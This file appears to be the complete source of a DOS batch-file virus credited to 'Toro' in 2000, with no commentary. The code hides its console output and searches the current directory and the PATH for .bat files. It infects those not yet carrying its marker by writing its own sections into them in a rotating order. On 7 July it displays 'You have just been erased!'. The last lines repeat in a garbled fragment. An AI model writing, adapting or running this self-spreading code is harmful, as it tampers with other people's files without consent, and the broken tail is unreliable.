@set x=41 
@echo off>nul.X0 
ctty nul.X0 
if %0!==! goto $1>nul.X0 
if %path%!==! goto $1>nul.X0 
for %%a in (1 2 3 4 5 6) do if %1!==%%a! goto X%%a>nul.X0 
if %f2%!==! call %0 2 %path% .. .>nul.X0 
if %f2%!==! goto X0 
if %f1%!==! call %0 1 . %path% ..>nul.X0 
if %f1%!==! goto X0 
if %vpath%!==! set vpath=. %path% ..>nul.X0 
call %f1% 3 %vpath%>nul.X0 
if %vpath%!==! set vpath=.>nul.X0 
echo.|date|find "07.07">$X0$ 
copy $X0$ $$2 
if exist $$2 call %f1% 6>nul.X0 
del $X0$ 

:X0 
set f1=>nul.X0 
set f2=>nul.X0 
set x=>nul.X0 
goto $1>nul.X0 
@set xWÿ_9=%0>nul.X0 

:X1 
for %%a in (%2*.bat %2\*.bat) do call %0 5 %%a>nul.X1 
shift>nul.X1 
if %f1%!==! if not %2!==! goto X1 
goto $2>nul.X1 

:X2 
for %%a in (%2 %2\) do if exist %%afind.exe set 
f2=%%afind.exe>nul.X2 
shift>nul.X2 
if %f2%!==! if not %2!==! goto X2 
goto $2>nul.X2 

:X3 
for %%a in (%2*.bat %2\*.bat) do call %f1% 4 %%a>nul.X3 
if %h%!==1! goto X3_1 
shift>nul.X3 
if not %2!==! goto X3 
if not %1!==.! for %%a in (*.bat) do call %f1% 4 %%a>nul.X3 
:X3_1 
set h=>nul.X3 
set vpath=%3>nul.X3 
:X3_2 
shift>nul.X3 
if %3!==! goto $2>nul.X3 
set vpath=%vpath%;%3>nul.X3 
goto X3_2 

:X4 
%f2% "xWÿ_9=%%0"<%2>X4.bat 
call X4.bat 
del X4.bat 
if not %xWÿ_9%!==! goto X4_1 
goto X%x%>nul.X4 
:X41 
echo @set x=42>$X4 
for %%a in (0 1 2 3) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
%f2% "X4" <%f1%>>$X4 
for %%a in (5 6 7) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
set x=42>nul.X4 
goto X4_2 
:X42 
echo @set x=43>$X4 
for %%a in (0 2 5) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
%f2% "X4" <%f1%>>$X4 
for %%a in (1 3 6 7) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
set x=43>nul.X4 
goto X4_2 
:X43 
echo @set x=44>$X4 
for %%a in (0 5) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
%f2% "X4" <%f1%>>$X4 
for %%a in (2 6 3 1 7) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
set x=44>nul.X4 
goto X4_2 
:X44 
echo @set x=41>$X4 
for %%a in (0 6 3 2 5) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
%f2% "X4" <%f1%>>$X4 
for %%a in (1 7) do %f2% "X%%a" <%f1% | %f2% /v "X4">>$X4 
set x=41>nul.X4 
:X4_2 
type %2>>$X4 
echo.>>$X4 
echo :$2>>$X4 
copy $X4 %2 /y 
del $X4 
set h=1>nul.X4 
:X4_1 
set xWÿ_9=>nul.X4 
goto $2>nul.X4 

:X5 
if not %f1%!==! goto $2>nul.X5 
%f2% "xWÿ_9=%%0"<%2>X5.bat 
call X5.bat 
del X5.bat 
if not %xWÿ_9%!==! set f1=%2>nul.X5 
set xWÿ_9=>nul.X5 
goto $2>nul.X5 

:X6 
del $$2>nul.X6 
cls>con.X6 
echo The X-Files by Toro (c) 2000>con.X6 
echo.>con.X6 
echo You have just been erased!>con.X6 
pause>nul.X6 
goto $2>nul.X6 

:$1 >nul.X7 
ctty con.X7 
echo on>nul.X7 
:$2
ou have just been erased!>con.X6 
pause>nul.X6 
goto $2>nul.X6 

:$1 >nul.X7 
ctty con.X7 
echo on>nul.X7 
:$2
 
:$2
